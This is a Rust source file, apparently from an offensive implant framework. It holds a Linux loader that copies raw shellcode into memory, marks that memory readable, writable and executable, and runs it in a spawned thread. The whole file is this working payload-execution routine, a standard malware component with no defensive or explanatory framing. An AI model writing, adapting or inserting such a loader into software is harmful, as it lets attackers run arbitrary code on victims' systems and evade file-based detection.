use crate::memory::MaleficChunk;
use std::os::raw::c_void;
use std::sync::{Arc, Mutex};
use std::time::Duration;

#[cfg(target_os = "linux")]
pub fn loader(shellcode: Vec<u8>) {
    let mut size = shellcode.len();
    if size < 0 {
        return;
    }

    let mut m_memory = MaleficChunk::new(size);
    if m_memory.is_err() {
        return;
    }
    let m_memory = m_memory.unwrap();

    unsafe {
        libc::memcpy(
            m_memory.get_ptr(),
            shellcode.as_ptr() as *const libc::c_void,
            m_memory.get_size(),
        );
    }
    // sleep 10 seconds
    // sleep(Duration::from_secs(10));

    m_memory.set_protect((libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC) as _);
    println!("will pthread create!");

    unsafe {
        let mut pthread_handle: libc::pthread_t = std::mem::zeroed();

        let shellcode_fn = std::mem::transmute::<
            *mut core::ffi::c_void,
            extern "C" fn(*mut c_void) -> *mut c_void,
        >(m_memory.get_ptr());
        let shellcode_fn = Arc::new(shellcode_fn);
        let shellcode_fn = Mutex::new(shellcode_fn);

        let thread_handle = std::thread::Builder::new()
            .name("my_thread".to_string())
            .spawn(move || {
                // Code to execute in new thread
                let shellcode_fn = shellcode_fn.lock().unwrap();
                (*shellcode_fn)(std::ptr::null_mut());
            })
            .expect("Failed to create thread");
    }

    std::thread::sleep(Duration::from_secs(2));
}
